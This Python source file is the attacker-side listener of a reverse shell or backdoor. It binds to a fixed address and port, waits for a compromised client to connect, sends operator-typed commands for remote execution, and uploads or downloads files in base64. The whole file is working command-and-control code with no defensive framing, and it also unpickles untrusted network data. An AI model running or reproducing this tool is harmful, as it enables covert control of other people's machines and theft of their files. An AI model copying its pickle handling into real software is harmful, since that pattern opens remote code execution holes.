import socket
import pickle
import base64

class Listener:
    def __init__(self, ip, port):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((ip, port))

        try:
            self.listener.listen(0)
            print("[+] Waiting for incoming connecitons")
            self.connection, address = self.listener.accept()
            self.connection.settimeout(0.1)
            print("[+] Got a connection from " + address[0])
        except KeyboardInterrupt:
            print("\r[-] Stopping waiting for incoming connections")
            exit()
    
    def send(self, data):
        self.connection.send(pickle.dumps(data))
    
    def receive(self):
        data = []
        while True:
            try:
                packet = self.connection.recv(4096)
            except socket.timeout:
                break
            data.append(packet)
        return pickle.loads(b"".join(data)).decode("utf-8").rstrip("/n")
    
    def remote_execute(self, command):
        self.send(command)
        return self.receive()
    
    def interrupt(self):
        print("\r[-] Closing session...")
        self.connection.close(); exit()
    
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
        return "[+] Downloaded successfully"
    
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())
    
    def run(self):
        try:
            while True:
                try:
                    command = input(">> ").split(" ")
                    if command[0] == "exit":
                        self.send(command)
                        self.interrupt()
                    
                    if command[0] == "upload":
                        command.append(self.read_file(command[1]))

                    res = self.remote_execute(command)
                    if "Error" not in res and command[0] == "download":
                        res = self.write_file(command[1], res.encode("utf-8"))

                    print(res)
                except Exception:
                    print("[-] Error occured while execution")
        except KeyboardInterrupt:
            self.interrupt()

if __name__ == "__main__":
    listener = Listener("192.168.159.146", 3333)
    listener.run()